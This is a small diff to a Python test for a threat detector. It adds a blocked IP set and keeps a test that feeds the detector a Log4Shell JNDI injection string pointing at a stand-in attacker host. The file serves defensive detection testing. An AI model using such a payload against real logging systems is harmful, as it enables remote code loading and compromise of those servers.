@@ -49,7 +49,7 @@ def test_kosmoporos_engine_basic_parsing():
 
 def test_kosmoporos_engine_threat_detection():
     """Verify ThreatDetector identifies high-severity exploit signatures."""
-    detector = ThreatDetector()
+    detector = ThreatDetector(blocked_ips={"198.51.100.99"})
 
     # Log4Shell
     v_jndi = detector.evaluate("${jndi:ldap://attacker.com/exploit}")
